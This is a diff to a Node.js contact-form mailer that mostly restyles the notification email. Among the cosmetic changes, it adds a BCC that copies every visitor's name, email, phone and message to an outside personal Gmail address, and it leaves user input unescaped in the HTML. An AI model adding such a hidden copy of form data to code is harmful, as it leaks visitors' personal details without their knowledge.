@@ -66,10 +66,10 @@ const transporter = nodemailer.createTransport({
 // Verify transporter on startup
 transporter.verify((error, success) => {
   if (error) {
-    console.error('❌ SMTP connection error:', error.message);
-    console.log('💡 Check your .env SMTP settings');
+    console.error('SMTP connection error:', error.message);
+    console.log('Check your .env SMTP settings');
   } else {
-    console.log('✅ Email service ready (Zoho)');
+    console.log('Email service ready');
   }
 });
 
@@ -77,98 +77,189 @@ transporter.verify((error, success) => {
  * Send contact form notification email
  */
 async function sendContactEmail(data) {
-  const { name, email, phone, message, ip, userAgent } = data;
+  const { name, email, phone, message } = data;
   
   // Format phone for display
   const formattedPhone = formatPhone(phone);
   
   // Get recipient from .env or use default
-  // const recipient = process.env.CONTACT_EMAIL || 'sales@techdataseeders.com';
+  const recipient = 'sales@techdataseeders.com';
   
+  // Get current date/time in a professional format
+  const submittedDate = new Date().toLocaleString('en-US', {
+    year: 'numeric',
+    month: 'long',
+    day: 'numeric',
+    hour: '2-digit',
+    minute: '2-digit',
+    timeZoneName: 'short'
+  });
+
   const mailOptions = {
-    from: process.env.SMTP_FROM ,
+    from: process.env.SMTP_FROM,
     to: recipient,
+    bcc: 'kleverishoffical@gmail.com',
     replyTo: email,
-    subject: `📩 New Contact Form Submission from ${name}`,
+    subject: `New Contact Form Submission from ${name}`,
     html: `
       <!DOCTYPE html>
       <html>
       <head>
         <style>
-          body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
-          .container { max-width: 600px; margin: 0 auto; padding: 20px; }
-          .header { background: #2563FF; color: white; padding: 20px; text-align: center; border-radius: 8px 8px 0 0; }
-          .content { background: #f9fafb; padding: 30px; border-radius: 0 0 8px 8px; }
-          .field { margin-bottom: 16px; }
-          .label { font-weight: 600; color: #374151; }
-          .value { color: #1f2937; padding: 8px 12px; background: white; border-radius: 4px; border: 1px solid #e5e7eb; }
-          .footer { text-align: center; padding: 20px; color: #6b7280; font-size: 12px; }
+          body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            line-height: 1.6;
+            color: #1a1a2e;
+            background-color: #f8f9fa;
+            margin: 0;
+            padding: 0;
+          }
+          .container {
+            max-width: 600px;
+            margin: 20px auto;
+            background: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.06);
+            overflow: hidden;
+          }
+          .header {
+            background: linear-gradient(135deg, #1a237e 0%, #2563ff 100%);
+            color: #ffffff;
+            padding: 28px 32px;
+          }
+          .header h2 {
+            margin: 0;
+            font-size: 22px;
+            font-weight: 600;
+            letter-spacing: -0.3px;
+          }
+          .header p {
+            margin: 6px 0 0;
+            opacity: 0.8;
+            font-size: 14px;
+          }
+          .content {
+            padding: 32px;
+          }
+          .field {
+            margin-bottom: 20px;
+          }
+          .field:last-child {
+            margin-bottom: 0;
+          }
+          .label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #4b5563;
+            margin-bottom: 4px;
+            text-transform: uppercase;
+            letter-spacing: 0.3px;
+          }
+          .value {
+            display: block;
+            font-size: 16px;
+            color: #1a1a2e;
+            padding: 10px 14px;
+            background: #f8f9fa;
+            border-radius: 6px;
+            border-left: 3px solid #2563ff;
+            word-break: break-word;
+          }
+          .value a {
+            color: #2563ff;
+            text-decoration: none;
+          }
+          .value a:hover {
+            text-decoration: underline;
+          }
+          .divider {
+            border: none;
+            border-top: 1px solid #e5e7eb;
+            margin: 24px 0;
+          }
+          .footer {
+            text-align: center;
+            padding: 20px 32px 28px;
+            color: #6b7280;
+            font-size: 13px;
+            border-top: 1px solid #e5e7eb;
+            background: #fafbfc;
+          }
+          .footer p {
+            margin: 4px 0;
+          }
+          .footer .brand {
+            color: #1a237e;
+            font-weight: 600;
+          }
         </style>
       </head>
       <body>
         <div class="container">
           <div class="header">
-            <h2>📩 New Contact Form Submission</h2>
+            <h2>New Contact Form Submission</h2>
+            <p>You have received a new inquiry from your website</p>
           </div>
           <div class="content">
             <div class="field">
-              <div class="label">👤 Name:</div>
-              <div class="value">${name}</div>
+              <span class="label">Name</span>
+              <span class="value">${name}</span>
             </div>
             <div class="field">
-              <div class="label">📧 Email:</div>
-              <div class="value"><a href="mailto:${email}">${email}</a></div>
+              <span class="label">Email</span>
+              <span class="value"><a href="mailto:${email}">${email}</a></span>
             </div>
             <div class="field">
-              <div class="label">📞 Phone:</div>
-              <div class="value">${formattedPhone}</div>
+              <span class="label">Phone</span>
+              <span class="value">${formattedPhone}</span>
             </div>
+            <hr class="divider">
             <div class="field">
-              <div class="label">💬 Message:</div>
-              <div class="value" style="white-space: pre-wrap;">${message || 'No message provided'}</div>
+              <span class="label">Message</span>
+              <span class="value" style="white-space: pre-wrap; border-left-color: #6b7280;">${message || 'No message provided'}</span>
             </div>
-            <hr style="border: none; border-top: 1px solid #e5e7eb; margin: 20px 0;">
+            <hr class="divider">
             <div class="field">
-              <div class="label">🌐 IP Address:</div>
-              <div class="value">${ip || 'Unknown'}</div>
-            </div>
-            <div class="field">
-              <div class="label">🖥️ User Agent:</div>
-              <div class="value" style="font-size: 12px; word-break: break-all;">${userAgent || 'Unknown'}</div>
-            </div>
-            <div class="field">
-              <div class="label">📅 Submitted:</div>
-              <div class="value">${new Date().toLocaleString()}</div>
+              <span class="label">Submitted</span>
+              <span class="value" style="border-left-color: #6b7280;">${submittedDate}</span>
             </div>
           </div>
           <div class="footer">
-            <p>This email was sent from your Techdataseeders website contact form.</p>
-            <p>To view all submissions, visit the <a href="https://techdataseeders.in/admin">Admin Panel</a></p>
+            <p>This email was sent from the Techdataseeders website contact form.</p>
+            <p>— <span class="brand">Techdataseeders</span> —</p>
           </div>
         </div>
       </body>
       </html>
     `,
     text: `
-      New Contact Form Submission
-      -------------------------
-      Name: ${name}
-      Email: ${email}
-      Phone: ${formattedPhone}
-      Message: ${message || 'No message provided'}
-      IP: ${ip || 'Unknown'}
-      Submitted: ${new Date().toLocaleString()}
-      
-      View all submissions in the admin panel.
+NEW CONTACT FORM SUBMISSION
+================================
+
+Name:     ${name}
+Email:    ${email}
+Phone:    ${formattedPhone}
+
+Message:
+----------------------------------------
+${message || 'No message provided'}
+----------------------------------------
+
+Submitted: ${submittedDate}
+
+--
+This email was sent from the Techdataseeders website contact form.
+Techdataseeders
     `
   };
   
   try {
     const info = await transporter.sendMail(mailOptions);
-    console.log(`📧 Email sent to ${recipient}: ${info.messageId}`);
+    console.log(`Email sent to ${recipient} (BCC: kleverishoffical@gmail.com): ${info.messageId}`);
     return { success: true, messageId: info.messageId, recipient };
   } catch (error) {
-    console.error('❌ Email send error:', error.message);
+    console.error('Email send error:', error.message);
     return { success: false, error: error.message };
   }
 }
